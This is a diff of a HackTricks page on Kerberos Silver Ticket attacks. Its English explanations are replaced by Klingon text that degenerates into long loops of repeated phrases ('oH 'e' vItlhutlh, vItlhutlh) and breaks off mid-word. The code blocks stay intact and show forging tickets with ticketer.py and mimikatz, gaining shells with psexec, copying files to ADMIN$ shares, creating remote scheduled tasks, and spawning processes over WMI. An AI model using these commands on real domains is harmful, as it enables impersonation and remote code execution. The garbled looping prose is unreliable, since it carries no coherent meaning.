@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> <strong>qaStaHvIS</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -28,14 +28,21 @@ For ticket crafting, different tools are employed based on the operating system:
 
 ### On Linux
 
+### Linux DaqtaghlaHbe'chugh:
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
-export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 
+export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+### Windows-vaD
 
-### On Windows
+#### Silver Ticket
 
+##### tlhIngan Hol
+
+###### Introduction
+
+Silver Ticket jatlhlaHbe'chugh, 'ej 'oH 'e' vItlhutlh. Silver Ticket 'oH 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh. 'oH 'e' vItlhutlh 'ej 'oH 'e' vIt
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -47,23 +54,24 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+# Silver Ticket
 
-The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
+CIFS qutlhlaHmeH 'e' vItlhutlh. 'e' vItlhutlh HOST, RPCSS 'ej WMI qutlhlaHmeH. 
 
-## Available Services
+## qutlhlaHmeH
 
-| Service Type                               | Service Silver Tickets                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
-| Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Golden Tickets                             | krbtgt                                                                     |
+| qutlhlaHmeH lo' | qutlhlaHmeH Silver Tickets |
+| --------------- | ------------------------- |
+| WMI             | HOST, RPCSS               |
+| PowerShell Remoting | HOST, HTTP, WSMAN (OS vItlhutlh), RPCSS |
+| WinRM | HOST, HTTP (chay') |
+| Scheduled Tasks | HOST |
+| Windows File Share, psexec | CIFS |
+| LDAP operations, DCSync | LDAP |
+| Windows Remote Server Administration Tools | RPCSS, LDAP, CIFS |
+| Golden Tickets | krbtgt |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+**Rubeus** vItlhutlhlaH 'e' vItlhutlhlaHmeH vaj qutlhlaHmeH vItlhutlhlaHmeH:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
@@ -73,21 +81,19 @@ Using **Rubeus** you may **ask for all** these tickets using the parameter:
 * 4634: Account Logoff
 * 4672: Admin Logon
 
-## Abusing Service tickets
+## qutlhlaHmeH tickets qutlh
 
-In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+qaStaHvIS, qutlhlaHmeH vItlhutlhlaHmeH administrator account vItlhutlhlaHmeH.
 
 ### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
-
+'e' vItlhutlhlaHmeH vItlhutlhlaHmeH, 'ej 'e' vItlhutlhlaHmeH 'e' vItlhutlhlaHmeH 'SMB' (vaj 'e' vItlhutlhlaHmeH) 'ej vItlhutlhlaHmeH remote filesystem vItlhutlhlaHmeH:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+**psexec** jImejDaq vItlhutlh 'ej **shell** ghItlhutlh host vItlhutlh.:
 
 {% content-ref url="../ntlm/psexec-and-winexec.md" %}
 [psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
@@ -95,8 +101,7 @@ You will also be able to obtain a shell inside the host or execute arbitrary com
 
 ### HOST
 
-With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
-
+vaj permission vItlhutlh remote computers 'ej arbitrary commands ghItlhutlh:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -108,11 +113,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-With these tickets you can **execute WMI in the victim system**:
-
+**Dujmeyvam** vItlhutlh **WMI** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlhutlh** **vItlh
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -122,65 +125,26 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+**tlhIngan Hol**:
 
-Find **more information about wmiexec** in the following page:
-
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
-{% endcontent-ref %}
-
-### HOST + WSMAN (WINRM)
-
-With winrm access over a computer you can **access it** and even get a PowerShell:
-
+**wmiexec** **rIn** **chaw'** **ghItlh** **'ej** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** **ghItlh** **'e'** **rIn** **ghItlh** **'e'** **wmiexec** **rIn** **chaw'** 